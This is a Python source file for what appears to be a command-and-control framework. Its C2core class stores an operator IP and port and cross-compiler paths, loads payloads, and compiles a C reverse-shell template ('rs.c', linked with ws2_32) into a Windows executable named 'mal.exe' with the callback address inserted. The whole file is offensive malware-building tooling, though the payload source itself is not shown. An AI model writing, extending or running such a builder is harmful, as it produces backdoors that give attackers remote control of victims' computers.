from modules.server import server
from modules.agent import agent
from utils.PL import PayloadLoader, IpAndPort
import json
import os
import subprocess

class C2core:
    __payloads = PayloadLoader()
    __settings = {"ip": None, "port": None, "x64gcc": None, "x86gcc": None}

    def __init__(self, ip=None, port=None) -> None:
        self.__settings["ip"] = ip
        self.__settings["port"] = port
    
    def CheckAttributes(self) -> list:
        NullAttributes = []

        for attr in self.__settings.keys():
            if self.__settings[attr] is None:
                NullAttributes.append(self.__settings[attr])

        return NullAttributes

    def SetAttributes(self, attribute: str, value) -> bool:
        if attribute not in self.__settings.keys():
            raise TypeError
        if attribute == "port":
            self.__settings[attribute] = int(value)
        else:
            self.__settings[attribute] = value.lower()

    def ListAll(self, name: str) -> dict:
        if name == "settings":
            return self.__settings
        elif name == "payloads":
            return self.__payloads
    
    def settings(self, method: str, name="settings.json") -> bool:
            if method.lower() == "save":
                if name[-5:] == ".json":
                    if os.path.exists(name):
                        raise FileExistsError
                    file = open(name, "w")
                    json.dump(self.__settings, file, indent=4)
                    file.close()
                    return True
                return False
            if method.lower() == "load":
                if not os.path.exists(name):
                    raise FileNotFoundError
                file = open(name, "r")
                self.__settings = json.loads(file.read())
                file.close()

    def compile(self, architecture: str, payload: str, name="mal.exe") -> str:
        if architecture == "64":
            compiler = "x64gcc"
        else:
            compiler = "x86gcc"

        IpAndPort(payload, self.__settings["ip"], self.__settings["port"])
        CompilationResult = subprocess.run([self.__settings[compiler], "rs.c", "-lws2_32", "-o", name], stderr=subprocess.PIPE)
        os.remove("rs.c")
        if CompilationResult.returncode == 0:
            return "Done."
        else:
            return f"Compilation failed with the following error:\n {CompilationResult.stderr.decode('utf-8')}"